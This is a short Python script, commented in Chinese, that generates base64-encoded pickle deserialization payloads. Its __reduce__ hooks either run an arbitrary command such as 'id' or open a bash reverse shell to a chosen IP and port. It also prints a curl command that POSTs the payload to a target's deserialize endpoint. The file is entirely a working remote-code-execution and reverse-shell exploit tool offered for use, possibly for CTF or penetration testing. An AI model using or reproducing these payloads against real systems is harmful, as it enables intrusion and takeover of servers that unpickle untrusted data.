#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
pickle 反序列化 payload 生成器
用法:
  python3 gen_pickle.py                   # 生成回显型 payload (执行 id)
  python3 gen_pickle.py --cmd "whoami"    # 自定义命令
  python3 gen_pickle.py --reverse 1.2.3.4 4444   # 生成反弹shell payload
"""
import pickle, base64, subprocess, sys

def cmd_payload(cmd_list):
    class RCE:
        def __reduce__(self):
            return (subprocess.check_output, (cmd_list,))
    return base64.b64encode(pickle.dumps(RCE())).decode()

def rev_payload(ip, port):
    class Rev:
        def __reduce__(self):
            cmd = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
            return (__import__("os").system, (cmd,))
    return base64.b64encode(pickle.dumps(Rev())).decode()

if __name__ == "__main__":
    args = sys.argv[1:]
    if "--reverse" in args:
        i = args.index("--reverse")
        ip, port = args[i+1], int(args[i+2])
        print(rev_payload(ip, port))
    else:
        cmd = ["id"]
        if "--cmd" in args:
            cmd = [args[args.index("--cmd")+1]]
        p = cmd_payload(cmd)
        print(p)
        print("\n发送方式: curl -X POST -d 'data=%s' http://<靶机>/api/deserialize" % p)